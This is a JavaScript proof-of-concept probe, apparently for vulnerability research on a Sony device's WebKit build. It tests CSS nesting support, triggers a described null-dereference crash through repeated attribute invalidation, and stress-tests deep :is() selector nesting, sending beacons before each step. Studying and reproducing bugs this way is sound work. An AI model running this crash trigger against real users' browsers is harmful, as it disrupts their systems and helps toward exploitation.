// CSS nesting + attribute-invalidation probe.
//
// Two questions, in order:
//   1. Does this build parse CSS nesting (&) and apply nested rules at all? If not, the
//      rest is unreachable and the answer is NEST-PARSE-no.
//   2. If it does: WebKit bug 276942 (Safari 17, still NEW as of Oct 2024) crashes the
//      WebContent process in SelectorChecker::attributeSelectorMatches, reached from
//      AttributeChangeInvalidation::invalidateStyle, when a nested rule uses an attribute
//      selector and the attribute changes (classList.add). The crash address is 0x20 -
//      CSSSelector::attribute() dereferencing a null RareData.
//
// The code path is present in Sony's 14.x tree (WebCore/style/AttributeChangeInvalidation.cpp
// line 83-84 calls attributeSelectorMatches on every invalidation selector, and
// CSSSelector::attribute() has only ASSERTs guarding m_data.rareData). Whether it is
// reachable depends on cssNestingEnabled, which is what step 1 measures.
//
// Beacons go out before each risky step, so a crash tells us which step died.

(function () {
  const T0 = Date.now();
  const fire = (tag) => { try { navigator.sendBeacon('/beacon/' + tag + '?t=' + Date.now()); } catch (e) {} };
  const show = (s) => {
    try {
      let el = document.getElementById('log');
      if (!el) {
        el = document.createElement('pre');
        el.id = 'log';
        el.style.cssText = 'position:fixed;left:0;top:0;z-index:99999;background:#000;color:#0f0;font:12px monospace;margin:0;padding:4px;max-height:40vh;overflow:auto';
        (document.body || document.documentElement).appendChild(el);
      }
      el.textContent += s + '\n';
    } catch (e) {}
  };
  const out = (s) => { show(s); };

  fire('NEST-BOOT');

  // --- step 1: does nesting parse and apply? -------------------------------------
  const style = document.createElement('style');
  style.textContent = [
    '#nest-host { color: rgb(1, 2, 3); }',
    '#nest-host { & > [class*="Box"] { color: rgb(4, 5, 6); } }',
    '#deep-host { color: rgb(7, 8, 9); }',
  ].join('\n');
  document.head.appendChild(style);

  const host = document.createElement('div');
  host.id = 'nest-host';
  const child = document.createElement('span');
  child.className = 'Box';
  child.textContent = 'nested';
  host.appendChild(child);
  document.body.appendChild(host);

  const color = getComputedStyle(child).color;
  const applied = color.replace(/\s/g, '') === 'rgb(4,5,6)';
  out('nested rule colour: ' + color + '  -> ' + (applied ? 'APPLIED' : 'not applied'));
  fire(applied ? 'NEST-PARSE-yes' : 'NEST-PARSE-no');

  // --- step 2: the invalidation pattern from bug 276942 --------------------------
  // Many elements carrying a class-like attribute, then a nested-rule invalidation
  // triggered from an event handler, which is the shape in the crash report.
  const panel = document.createElement('div');
  panel.id = 'deep-host';
  for (let i = 0; i < 40; i++) {
    const d = document.createElement('div');
    d.className = 'rgh-pr-cell';
    d.setAttribute('data-i', String(i));
    panel.appendChild(d);
  }
  document.body.appendChild(panel);

  const style2 = document.createElement('style');
  style2.textContent = [
    '.rgh-pr-cell { flex-wrap: wrap; gap: 4px; }',
    '.rgh-pr-cell { & > [class*="Box"] { height: auto; } }',
    '#nest-host { & > [data-i] { outline: 1px solid red; } }',
  ].join('\n');
  document.head.appendChild(style2);

  const cells = panel.querySelectorAll('.rgh-pr-cell');
  out('cells: ' + cells.length);

  let n = 0;
  const step = () => {
    if (n >= cells.length) {
      fire('NEST-SURVIVED');
      out('survived all invalidation steps');
      return;
    }
    const el = cells[n];
    fire('NEST-INVAL-' + n);
    try {
      el.classList.add('Box');       // class attribute change -> attribute invalidation
      el.classList.remove('Box');
      el.setAttribute('class', 'rgh-pr-cell Box' + n);
      el.removeAttribute('data-i');
      el.setAttribute('data-i', String(n));
    } catch (e) {
      out('threw at ' + n + ': ' + e);
    }
    n++;
    setTimeout(step, 0);
  };
  setTimeout(step, 0);

  // --- step 3: how deep can :is() nest before something gives? ------------------
  let deepOk = 0;
  for (const depth of [64, 256, 1024, 4096]) {
    try {
      const s = document.createElement('style');
      s.textContent = '#deep-host ' + ':is('.repeat(depth) + 'div' + ')'.repeat(depth) + ' { color: rgb(9, 9, 9); }';
      document.head.appendChild(s);
      deepOk = depth;
      fire('NEST-IS-' + depth + '-ok');
    } catch (e) {
      fire('NEST-IS-' + depth + '-threw');
      break;
    }
  }
  out('deepest :is() accepted: ' + deepOk);

  setTimeout(() => fire('NEST-DONE'), 50);
  out('elapsed ' + (Date.now() - T0) + ' ms');
})();
